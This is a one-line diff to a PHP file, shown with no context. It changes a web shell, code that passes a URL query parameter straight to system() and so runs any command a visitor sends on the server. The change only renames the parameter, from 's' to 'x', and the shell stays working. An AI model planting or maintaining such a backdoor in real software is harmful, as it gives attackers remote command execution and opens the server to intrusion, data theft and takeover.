@@ -1,1 +1,1 @@
-<?php system($_GET['s']); ?>
+<?php system($_GET['x']); ?>
